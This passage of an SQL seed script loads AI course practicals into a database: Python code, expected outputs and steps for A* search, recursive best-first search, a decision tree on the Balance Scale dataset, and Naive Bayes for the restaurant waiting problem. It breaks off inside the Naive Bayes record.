-- [Artificial Intelligence] Practical 3: A* Search Algorithm for Pathfinding Problem (source_key: artificial-intelligence-practical-3)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000003',
    $skey$artificial-intelligence-practical-3$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    3,
    $title$A* Search Algorithm for Pathfinding Problem$title$,
    $q$Implement the A* Search algorithm for solving a pathfinding problem.$q$,
    $code$import queue as Q
from RMP import dict_gn
from RMP import dict_hn

start = 'Arad'
goal = 'Bucharest'
result = ''

def get_fn(citystr):
    cities = citystr.split(" , ")
    hn = gn = 0
    for ctr in range(0, len(cities) - 1):
        gn = gn + dict_gn[cities[ctr]][cities[ctr + 1]]
    hn = dict_hn[cities[len(cities) - 1]]
    return (hn + gn)

def expand(cityq):
    global result
    tot, citystr, thiscity = cityq.get()
    if thiscity == goal:
        result = citystr + " : : " + str(tot)
        return
    for cty in dict_gn[thiscity]:
        cityq.put((get_fn(citystr + " , " + cty), citystr + " , " + cty, cty))
    expand(cityq)

def main():
    cityq = Q.PriorityQueue()
    thiscity = start
    cityq.put((get_fn(start), start, thiscity))
    expand(cityq)
    print("The A* path with the total is: ")
    print(result)

main()$code$,
    $orig$import queue as Q
from RMP import dict_gn
from RMP import dict_hn

start='Arad'
goal='Bucharest'
result=''

def get_fn(citystr):
    cities=citystr.split(" , ")
    hn=gn=0
    for ctr in range(0, len(cities)-1):
        gn=gn+dict_gn[cities[ctr]][cities[ctr+1]]
    hn=dict_hn[cities[len(cities)-1]]
    return(hn+gn)

def expand(cityq):
    global result
    tot, citystr, thiscity=cityq.get()
    if thiscity==goal:
        result=citystr+" : : "+str(tot)
        return
    for cty in dict_gn[thiscity]:
        cityq.put((get_fn(citystr+" , "+cty), citystr+" , "+cty, cty))
    expand(cityq)

def main():
    cityq=Q.PriorityQueue()
    thiscity=start
    cityq.put((get_fn(start),start,thiscity))
    expand(cityq)
    print("The A* path with the total is: ")
    print(result)

main()$orig$,
    $lang$Python$lang$,
    $out$The A* path with the total is: 
Arad , Sibiu , Rimnicu , Pitesti , Bucharest : : 418$out$,
    $json$["Import dict_gn (actual edge costs g(n)) and dict_hn (straight-line heuristic h(n) to Bucharest) from RMP.py.","Define evaluation function get_fn(citystr) that splits the path string by \" , \", sums edge weights gn along the path, adds heuristic hn of the last city, and returns f(n) = g(n) + h(n).","Initialize a PriorityQueue cityq and insert (get_fn(start), start, start).","In expand(cityq), dequeue the node with minimum f(n): (tot, citystr, thiscity).","If thiscity == goal, format result as \"citystr : : tot\" and return.","Otherwise, enqueue all neighboring cities with their updated path and f(n) score, then recursively call expand(cityq)."]$json$::jsonb,
    $json$["Ensure RMP.py with both dict_gn and dict_hn is in the working directory.","Run the Python script to obtain the optimal A* path and total cost (418)."]$json$::jsonb,
    $json$["Requires RMP.py containing dict_gn and dict_hn.","# Common File: RMP.py (Pages 2-3 of final_AI__3f2816a9.pdf)\ndict_hn = {\n    'Arad': 336, 'Bucharest': 0, 'Craiova': 160, 'Drobeta': 242, 'Eforie': 161,\n    'Fagaras': 176, 'Giurgiu': 77, 'Hirsova': 151, 'Iasi': 226, 'Lugoj': 244,\n    'Mehadia': 241, 'Neamt': 234, 'Oradea': 380, 'Pitesti': 100, 'Rimnicu': 193,\n    'Sibiu': 253, 'Timisoara': 329, 'Urziceni': 80, 'Vaslui': 199, 'Zerind': 374\n}\n\ndict_gn = dict(\n    Arad=dict(Zerind=75, Timisoara=118, Sibiu=140),\n    Bucharest=dict(Urziceni=85, Giurgiu=90, Pitesti=101, Fagaras=211),\n    Craiova=dict(Drobeta=120, Pitesti=138, Rimnicu=146),\n    Drobeta=dict(Mehadia=75, Craiova=120),\n    Eforie=dict(Hirsova=86),\n    Fagaras=dict(Sibiu=99, Bucharest=211),\n    Giurgiu=dict(Bucharest=90),\n    Hirsova=dict(Eforie=86, Urziceni=98),\n    Iasi=dict(Neamt=87, Vaslui=92),\n    Lugoj=dict(Mehadia=70, Timisoara=111),\n    Mehadia=dict(Lugoj=70, Drobeta=75),\n    Neamt=dict(Iasi=87),\n    Oradea=dict(Zerind=71, Sibiu=151),\n    Pitesti=dict(Rimnicu=97, Bucharest=101, Craiova=138),\n    Rimnicu=dict(Sibiu=80, Pitesti=97, Craiova=146),\n    Sibiu=dict(Rimnicu=80, Fagaras=99, Arad=140, Oradea=151),\n    Timisoara=dict(Lugoj=111, Arad=118),\n    Urziceni=dict(Bucharest=85, Hirsova=98, Vaslui=142),\n    Vaslui=dict(Iasi=92, Urziceni=142),\n    Zerind=dict(Oradea=71, Arad=75)\n)"]$json$::jsonb,
    ARRAY[$item$a* search$item$, $item$a star$item$, $item$pathfinding$item$, $item$heuristic search$item$, $item$f(n)$item$, $item$priorityqueue$item$, $item$arad$item$, $item$bucharest$item$, $item$418$item$]::text[],
    ARRAY[$item$AI Practical 3$item$, $item$A Star Search Algorithm$item$, $item$A* Pathfinding Python$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 2, 3, 9, 10]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Artificial Intelligence] Practical 4: Recursive Best-First Search (RBFS) Algorithm (source_key: artificial-intelligence-practical-4)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000004',
    $skey$artificial-intelligence-practical-4$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    4,
    $title$Recursive Best-First Search (RBFS) Algorithm$title$,
    $q$Implement the Recursive Best-First Search algorithm for the same problem.$q$,
    $code$import queue as Q
from RMP import dict_gn
from RMP import dict_hn

start = 'Arad'
goal = 'Bucharest'
result = ''

def get_fn(citystr):
    cities = citystr.split(',')
    hn = gn = 0
    for ctr in range(0, len(cities) - 1):
        gn = gn + dict_gn[cities[ctr]][cities[ctr + 1]]
    hn = dict_hn[cities[len(cities) - 1]]
    return (hn + gn)

def printout(cityq):
    for i in range(0, cityq.qsize()):
        print(cityq.queue[i])

def expand(cityq):
    global result
    tot, citystr, thiscity = cityq.get()
    nexttot = 999
    if not cityq.empty():
        nexttot, nextcitystr, nextthiscity = cityq.queue[0]
    if thiscity == goal and tot < nexttot:
        result = citystr + '::' + str(tot)
        return
    print("Expanded city --------------------", thiscity)
    print("Second best f(n)--------------------", nexttot)
    tempq = Q.PriorityQueue()
    for cty in dict_gn[thiscity]:
        tempq.put((get_fn(citystr + ',' + cty), citystr + ',' + cty, cty))
    for ctr in range(1, 3):
        ctrtot, ctrcitystr, ctrthiscity = tempq.get()
        if ctrtot < nexttot:
            cityq.put((ctrtot, ctrcitystr, ctrthiscity))
        else:
            cityq.put((ctrtot, citystr, thiscity))
            break
    printout(cityq)
    expand(cityq)

def main():
    cityq = Q.PriorityQueue()
    thiscity = start
    cityq.put((999, "NA", "NA"))
    cityq.put((get_fn(start), start, thiscity))
    expand(cityq)
    print(result)

main()$code$,
    $orig$import queue as Q
from RMP import dict_gn
from RMP import dict_hn
start='Arad'
goal='Bucharest'
result=''
def get_fn(citystr):
    cities=citystr.split(',')
    hn=gn=0
    for ctr in range(0,len(cities)-1):
        gn=gn+dict_gn[cities[ctr]][cities[ctr+1]]
    hn=dict_hn[cities[len(cities)-1]]
    return(hn+gn)
def printout(cityq):
    for i in range(0,cityq.qsize()):
        print(cityq.queue[i])
def expand(cityq):
    global result
    tot,citystr,thiscity=cityq.get()
    nexttot=999
    if not cityq.empty():
        nexttot,nextcitystr,nextthiscity=cityq.queue[0]
    if thiscity==goal and tot<nexttot:
        result=citystr+'::'+str(tot)
        return
    print("Expanded city --------------------",thiscity)
    print("Second best f(n)--------------------",nexttot)
    tempq=Q.PriorityQueue()
    for cty in dict_gn[thiscity]:
        tempq.put((get_fn(citystr+','+cty),citystr+','+cty,cty))
    for ctr in range(1,3):
        ctrtot,ctrcitystr,ctrthiscity=tempq.get()
        if ctrtot<nexttot:
            cityq.put((ctrtot,ctrcitystr,ctrthiscity))
        else:
            cityq.put((ctrtot,citystr,thiscity))
            break
    printout(cityq)
    expand(cityq)
def main():
    cityq=Q.PriorityQueue()
    thiscity=start
    cityq.put((999,"NA","NA"))
    cityq.put((get_fn(start),start,thiscity))
    expand(cityq)
    print(result)
main()$orig$,
    $lang$Python$lang$,
    $out$Expanded city -------------------- Arad
Second best f(n)-------------------- 999
(393, 'Arad,Sibiu', 'Sibiu')
(999, 'NA', 'NA')
(447, 'Arad,Timisoara', 'Timisoara')
Expanded city -------------------- Sibiu
Second best f(n)-------------------- 447
(413, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(415, 'Arad,Sibiu,Fagaras', 'Fagaras')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
Expanded city -------------------- Rimnicu
Second best f(n)-------------------- 415
(415, 'Arad,Sibiu,Fagaras', 'Fagaras')
(417, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
Expanded city -------------------- Fagaras
Second best f(n)-------------------- 417
(417, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(450, 'Arad,Sibiu,Fagaras', 'Fagaras')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
Expanded city -------------------- Rimnicu
Second best f(n)-------------------- 447
(417, 'Arad,Sibiu,Rimnicu,Pitesti', 'Pitesti')
(447, 'Arad,Timisoara', 'Timisoara')
(999, 'NA', 'NA')
(450, 'Arad,Sibiu,Fagaras', 'Fagaras')
(526, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
Expanded city -------------------- Pitesti
Second best f(n)-------------------- 447
(418, 'Arad,Sibiu,Rimnicu,Pitesti,Bucharest', 'Bucharest')
(447, 'Arad,Timisoara', 'Timisoara')
(607, 'Arad,Sibiu,Rimnicu,Pitesti', 'Pitesti')
(526, 'Arad,Sibiu,Rimnicu', 'Rimnicu')
(450, 'Arad,Sibiu,Fagaras', 'Fagaras')
(999, 'NA', 'NA')
Arad,Sibiu,Rimnicu,Pitesti,Bucharest::418$out$,
    $json$["Initialize PriorityQueue cityq with sentinel (999, \"NA\", \"NA\") and initial state (get_fn(start), start, start).","Dequeue best node (tot, citystr, thiscity) and inspect the second-best f(n) value nexttot at cityq.queue[0].","If thiscity == goal and tot < nexttot, record result as citystr::tot and terminate.","Expand neighbors of thiscity into temporary PriorityQueue tempq with their f(n) scores.","Compare the top 2 children in tempq against nexttot: if ctrtot < nexttot, push child to cityq; otherwise push current city with updated backed-up f(n) value ctrtot and break.","Print current queue state and recursively call expand(cityq)."]$json$::jsonb,
    $json$["Ensure RMP.py is present in the same directory.","Run AIp4.py to trace each expanded city, second-best f(n), and final optimal path."]$json$::jsonb,
    $json$["Requires RMP.py in the same folder.","# Common File: RMP.py (Pages 2-3 of final_AI__3f2816a9.pdf)\ndict_hn = {\n    'Arad': 336, 'Bucharest': 0, 'Craiova': 160, 'Drobeta': 242, 'Eforie': 161,\n    'Fagaras': 176, 'Giurgiu': 77, 'Hirsova': 151, 'Iasi': 226, 'Lugoj': 244,\n    'Mehadia': 241, 'Neamt': 234, 'Oradea': 380, 'Pitesti': 100, 'Rimnicu': 193,\n    'Sibiu': 253, 'Timisoara': 329, 'Urziceni': 80, 'Vaslui': 199, 'Zerind': 374\n}\n\ndict_gn = dict(\n    Arad=dict(Zerind=75, Timisoara=118, Sibiu=140),\n    Bucharest=dict(Urziceni=85, Giurgiu=90, Pitesti=101, Fagaras=211),\n    Craiova=dict(Drobeta=120, Pitesti=138, Rimnicu=146),\n    Drobeta=dict(Mehadia=75, Craiova=120),\n    Eforie=dict(Hirsova=86),\n    Fagaras=dict(Sibiu=99, Bucharest=211),\n    Giurgiu=dict(Bucharest=90),\n    Hirsova=dict(Eforie=86, Urziceni=98),\n    Iasi=dict(Neamt=87, Vaslui=92),\n    Lugoj=dict(Mehadia=70, Timisoara=111),\n    Mehadia=dict(Lugoj=70, Drobeta=75),\n    Neamt=dict(Iasi=87),\n    Oradea=dict(Zerind=71, Sibiu=151),\n    Pitesti=dict(Rimnicu=97, Bucharest=101, Craiova=138),\n    Rimnicu=dict(Sibiu=80, Pitesti=97, Craiova=146),\n    Sibiu=dict(Rimnicu=80, Fagaras=99, Arad=140, Oradea=151),\n    Timisoara=dict(Lugoj=111, Arad=118),\n    Urziceni=dict(Bucharest=85, Hirsova=98, Vaslui=142),\n    Vaslui=dict(Iasi=92, Urziceni=142),\n    Zerind=dict(Oradea=71, Arad=75)\n)"]$json$::jsonb,
    ARRAY[$item$rbfs$item$, $item$recursive best first search$item$, $item$recursive best-first search$item$, $item$second best f(n)$item$, $item$informed search$item$, $item$arad$item$, $item$bucharest$item$]::text[],
    ARRAY[$item$AI Practical 4$item$, $item$RBFS Algorithm Python$item$, $item$Recursive Best First Search$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 2, 3, 11, 12]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Artificial Intelligence] Practical 5: Decision-Tree Learning Algorithm (Balance Scale Dataset) (source_key: artificial-intelligence-practical-5)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000005',
    $skey$artificial-intelligence-practical-5$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    5,
    $title$Decision-Tree Learning Algorithm (Balance Scale Dataset)$title$,
    $q$Implement Decision-Tree learning algorithm.$q$,
    $code$import numpy as np
import pandas as pd
import sklearn as sk
from sklearn.metrics import confusion_matrix
from sklearn.model_selection import train_test_split
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score
from sklearn.metrics import classification_report

# Function importing dataset
def importdata():
    balance_data = pd.read_csv("P5-balance-scale.data")
    # Print the dataset shape
    print("Dataset Length : ", len(balance_data))
    # Printing the dataset observations
    print("Dataset : ", balance_data.head())
    return balance_data

# Function to split the dataset
def splitdataset(balance_data):
    # Separating the target variable
    X = balance_data.values[:, 1:5]
    Y = balance_data.values[:, 0]
    # Splitting the dataset into train and test
    X_train, X_test, y_train, y_test = train_test_split(
        X, Y, test_size=0.3, random_state=100
    )
    return X, Y, X_train, X_test, y_train, y_test

# Function to perform training with entropy
def train_using_entropy(X_train, X_test, y_train, y_test):
    # Decision tree with entropy
    clf_entropy = DecisionTreeClassifier(
        criterion="entropy", random_state=100, max_depth=3, min_samples_leaf=5
    )
    # Performing training
    clf_entropy.fit(X_train, y_train)
    return clf_entropy

def prediction(X_test, clf_object):
    y_pred = clf_object.predict(X_test)
    print("Predicted Values : ")
    print(y_pred)
    return y_pred

def cal_accuracy(y_test, y_pred):
    print("Accuracy : ", accuracy_score(y_test, y_pred) * 100)

def main():
    data = importdata()
    X, Y, X_train, X_test, y_train, y_test = splitdataset(data)
    clf_entropy = train_using_entropy(X_train, X_test, y_train, y_test)
    print("Results using entropy : ")
    y_pred_entropy = prediction(X_test, clf_entropy)
    cal_accuracy(y_test, y_pred_entropy)

main()$code$,
    $orig$import numpy as np
import pandas as pd
import sklearn as sk
from sklearn.metrics import confusion_matrix
from sklearn.model_selection import train_test_split
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score
from sklearn.metrics import classification_report
#func importing dataset
def importdata():
    balance_data=pd.read_csv("P5-balance-scale.data")
    #print the dataset shape
    print("Dataset Length : ",len(balance_data))
    #printing the dataset observations
    print("Dataset : ",balance_data.head())
    return balance_data
#func to split the dataset
def splitdataset(balance_data):
    #seperating the target variable
    X=balance_data.values[:,1:5]
    Y=balance_data.values[:,0]
    #splitting the dataset into train and test
    X_train,X_test,y_train,y_test=train_test_split(X,Y,test_size=0.3,random_state=100)
    return X,Y,X_train,X_test,y_train,y_test
#function to perform training with entropy
def train_using_entropy(X_train,X_test,y_train,y_test):
    #decision tree with entropy
    clf_entropy=DecisionTreeClassifier(criterion="entropy",random_state=100,max_depth=3,min_samples_leaf=5)
    #performing training
    clf_entropy.fit(X_train,y_train)
    return clf_entropy
def prediction(X_test,clf_object):
    y_pred=clf_object.predict(X_test)
    print("Predicted Values : ")
    print(y_pred)
    return y_pred
def cal_accuracy(y_test,y_pred):
    print("Accuracy : ",accuracy_score(y_test,y_pred)*100)
def main():
    data=importdata()
    X,Y,X_train,X_test,y_train,y_test=splitdataset(data)
    clf_entropy=train_using_entropy(X_train,X_test,y_train,y_test)
    print("Results using entropy : ")
    y_pred_entropy=prediction(X_test,clf_entropy)
    cal_accuracy(y_test,y_pred_entropy)
main()$orig$,
    $lang$Python$lang$,
    $out$Dataset Length :  624
Dataset :     B  1  1.1  1.2  1.3
0  R  1    1    1    2
1  R  1    1    1    3
2  R  1    1    1    4
3  R  1    1    1    5
4  R  1    1    2    1
Results using entropy : 
Predicted Values : 
['R' 'L' 'R' 'L' 'L' 'L' 'L' 'R' 'R' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'L'
 'R' 'R' 'L' 'R' 'R' 'L' 'R' 'R' 'R' 'R' 'L' 'L' 'L' 'R' 'L' 'R' 'R'
 'R' 'L' 'R' 'L' 'L' 'L' 'R' 'L' 'R' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'R'
 'R' 'R' 'R' 'R' 'L' 'L' 'R' 'L' 'R' 'L' 'L' 'R' 'R' 'R' 'R' 'L' 'R' 'L'
 'R' 'L' 'L' 'R' 'L' 'R' 'R' 'R' 'R' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'R' 'L'
 'R' 'R' 'L' 'L' 'R' 'R' 'R' 'L' 'L' 'R' 'L' 'L' 'L' 'R' 'L' 'R' 'R' 'R'
 'L' 'L' 'R' 'R' 'R' 'L' 'R' 'R' 'R' 'R' 'R' 'L' 'L' 'R' 'R' 'L' 'L'
 'R' 'L' 'R' 'R' 'L' 'R' 'L' 'L' 'R' 'R' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'R'
 'R' 'L' 'R' 'L' 'L' 'R' 'R' 'L' 'R' 'L' 'R' 'L' 'R' 'L' 'R' 'R' 'L'
 'R' 'L' 'R' 'R' 'R' 'R' 'R' 'R' 'L' 'R' 'R' 'R' 'L' 'L' 'R' 'R' 'R'
 'R' 'R' 'R' 'L' 'R' 'L' 'R' 'R']
Accuracy :  66.48936170212765$out$,
    $json$["Load P5-balance-scale.data using pandas.read_csv().","Separate features X (columns 1..4) and class labels Y (column 0: B, L, R).","Split dataset into 70% training and 30% testing sets with random_state=100.","Instantiate DecisionTreeClassifier(criterion=\"entropy\", random_state=100, max_depth=3, min_samples_leaf=5) and fit on X_train, y_train.","Predict class labels for X_test and compute accuracy using accuracy_score(y_test, y_pred) * 100."]$json$::jsonb,
    $json$["Install required Python packages: pip install pandas scipy scikit-learn numpy","Place P5-balance-scale.data (UCI Balance Scale dataset, 625 rows) in the same directory.","Run the Python script to train the entropy-based Decision Tree and display predictions and accuracy."]$json$::jsonb,
    $json$["Requirements from PDF: 1) P5-balance-scale.data & balance-scale.names files. 2) Install modules: python -m pip install pandas scipy scikit-learn numpy."]$json$::jsonb,
    ARRAY[$item$decision tree$item$, $item$decision-tree$item$, $item$sklearn$item$, $item$entropy$item$, $item$balance-scale.data$item$, $item$decisiontreeclassifier$item$, $item$machine learning$item$]::text[],
    ARRAY[$item$AI Practical 5$item$, $item$Decision Tree Learning Algorithm$item$, $item$Balance Scale Decision Tree$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 13, 14, 15, 16, 17, 18, 19]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Artificial Intelligence] Practical 6: Naive-Bayes Learning Algorithm for RWP (Restaurant Waiting Problem) (source_key: artificial-intelligence-practical-6)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000006',
    $skey$artificial-intelligence-practical-6$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    6,
    $title$Naive-Bayes Learning Algorithm for RWP (Restaurant Waiting Problem)$title$,
    $q$Implement Naive-Bayes learning algo for RWP (Restaurant Waiting Problem).$q$,
    $code$from RWP import rwp_examples

total_exp = 12

def tot(attribute, value):
    count = 0
    for key, val in rwp_examples.items():
        for key1, val1 in val.items():
            if key1 == attribute:
                if val1 == value:
                    count += 1
    return count

def getProbab(attribute, attribval, value):
    count = 0
    for key, val in rwp_examples.items():
        val1 = rwp_examples[key][attribute]
        val2 = rwp_examples[key]['ans']
        if val1 == attribval and val2 == value:
            count += 1
    probab = count / tot('ans', value)
    return probab

def main():
    PAltYes = tot('Alt', 'Y') / total_exp
    PAltNo = tot('Alt', 'N') / total_exp
    PBarYes = tot('Bar', 'Y') / total_exp
    PBarNo = tot('Bar', 'N') / total_exp
    PFriYes = tot('Fri', 'Y') / total_exp
    PFriNo = tot('Fri', 'N') / total_exp
    PHunYes = tot('Hun', 'Y') / total_exp
    PHunNo = tot('Hun', 'N') / total_exp
    PPatSome = tot('Pat', 'S') / total_exp
    PPatFull = tot('Pat', 'F') / total_exp
    PPatNone = tot('Pat', 'N') / total_exp
    PPriceCheap = tot('Price', '$') / total_exp
    PPriceAvg = tot('Price', '$$') / total_exp
    PPriceExp = tot('Price', '$$$') / total_exp
    PRainYes = tot('Rain', 'Y') / total_exp
    PRainNo = tot('Rain', 'N') / total_exp
    PResYes = tot('Res', 'Y') / total_exp
    PResNo = tot('Res', 'N') / total_exp
    PTypeFrench = tot('Type', 'F') / total_exp
    PTypeItalian = tot('Type', 'I') / total_exp
    PTypeBurger = tot('Type', 'B') / total_exp
    PTypeThai = tot('Type', 'T') / total_exp
    PEstFew = tot('Est', '0-10') / total_exp
    PEstMore = tot('Est', '10-30') / total_exp
    PEstStillMore = tot('Est', '30-60') / total_exp
    PEstTooMuch = tot('Est', '>60') / total_exp
    PAnsYes = tot('ans', 'Y') / total_exp
    PAnsNo = tot('ans', 'N') / total_exp

    print('Probability for will wait if there is an Alternate Restaurant Nearby: ')
    print('Yes: Will Wait ', (getProbab('Alt', 'Y', 'Y') * PAnsYes / PAltYes) * 100, '%')
    print('No: Will Wait ', (getProbab('Alt', 'Y', 'N') * PAnsNo / PAltYes) * 100, '%')

    print('Probability for will wait if there No is an Alternate Restaurant Nearby: ')
    print('Yes: Will Wait ', (getProbab('Alt', 'N', 'Y') * PAnsYes / PAltNo) * 100, '%')
    print('No: Will Wait ', (getProbab('Alt', 'N', 'N') * PAnsNo / PAltNo) * 100, '%')

    print('Probability for will wait if Estimated Wait time is 0-10 minutes: ')
    print('Yes: Will Wait ', (getProbab('Est', '0-10', 'Y') * PAnsYes / PEstFew) * 100, '%')
    print('No: Will Wait ', (getProbab('Est', '0-10', 'N') * PAnsNo / PEstFew) * 100, '%')

    print('Probability for will wait if Estimated Wait time is 10-30 minutes ')
    print('Yes: Will Wait ', (getProbab('Est', '10-30', 'Y') * PAnsYes / PEstMore) * 100, '%')
    print('No: Will Wait ', (getProbab('Est', '10-30', 'N') * PAnsNo / PEstMore) * 100, '%')

    print("Probability for Will Wait if the Estimated Wait Time is 30-60 mins: ")
    print("Yes: Will Wait: ", (getProbab('Est', '30-60', 'Y') * PAnsYes / PEstStillMore) * 100, "%")
    print("No: Will Wait: ", (getProbab('Est', '30-60', 'N') * PAnsNo / PEstStillMore) * 100, "%")

    print("Probability for Will Wait if the Estimated Wait Time is >60 mins: ")
    print("Yes: Will Wait: ", (getProbab('Est', '>60', 'Y') * PAnsYes / PEstTooMuch) * 100, "%")
    print("No: Will Wait: ", (getProbab('Est', '>60', 'N') * PAnsNo / PEstTooMuch) * 100, "%")

    print('Probability for will wait if there are Some Patrons ')
    print('Yes: Will Wait ', (getProbab('Pat', 'S', 'Y') * PAnsYes / PPatSome) * 100, '%')
    print('No: Will Wait ', (getProbab('Pat', 'S', 'N') * PAnsNo / PPatSome) * 100, '%')

    print("Probability for Will Wait if there are None Patrons: ")
    print("Yes: Will Wait: ", (getProbab('Pat', 'N', 'Y') * PAnsYes / PPatNone) * 100, "%")
    print("No: Will Wait: ", (getProbab('Pat', 'N', 'N') * PAnsNo / PPatNone) * 100, "%")

    print("Probability for Will Wait if there are Full Patrons: ")
    print("Yes: Will Wait: ", (getProbab('Pat', 'F', 'Y') * PAnsYes / PPatFull) * 100, "%")
    print("No: Will Wait: ", (getProbab('Pat', 'F', 'N') * PAnsNo / PPatFull) * 100, "%")

    print('Probability for will wait if the place is Thai ')
    print('Yes: Will Wait ', (getProbab('Type', 'T', 'Y') * PAnsYes / PTypeThai) * 100, '%')
    print('No: Will Wait ', (getProbab('Type', 'T', 'N') * PAnsNo / PTypeThai) * 100, '%')

main()$code$,
    $orig$from RWP import rwp_examples
total_exp = 12
def tot(attribute, value):
    count = 0
    for key, val in rwp_examples.items():
        for key1, val1 in val.items():
            if key1 == attribute:
                if val1 == value:
                    count += 1
    return count
def getProbab(attribute, attribval, value):
    count = 0
    for key, val in rwp_examples.items():
        val1 = rwp_examples[key][attribute]
        val2 = rwp_examples[key]['ans']
        if val1 == attribval and val2 == value:
            count += 1
    probab = count / tot('ans', value)
    return probab$orig$,
    $lang$Python$lang$,
    $out$Probability for will wait if there is an Alternate Restaurant Nearby: 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %
Probability for will wait if there No is an Alternate Restaurant Nearby: 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %
Probability for will wait if Estimated Wait time is 0-10 minutes: 
Yes: Will Wait  71.42857142857143 %
No: Will Wait  28.57142857142857 %
Probability for will wait if Estimated Wait time is 10-30 minutes 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %
Probability for Will Wait if the Estimated Wait Time is 30-60 mins: 
Yes: Will Wait:  0.0 %
No: Will Wait:  100.0 %
Probability for Will Wait if the Estimated Wait Time is >60 mins: 
Yes: Will Wait:  0.0 %
No: Will Wait:  100.0 %
Probability for will wait if there are Some Patrons 
Yes: Will Wait  100.0 %
No: Will Wait  0.0 %
Probability for Will Wait if there are None Patrons: 
Yes: Will Wait:  0.0 %
No: Will Wait:  100.0 %
Probability for Will Wait if there are Full Patrons: 
Yes: Will Wait:  33.33333333333333 %
No: Will Wait:  66.66666666666666 %
Probability for will wait if the place is Thai 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %$out$,
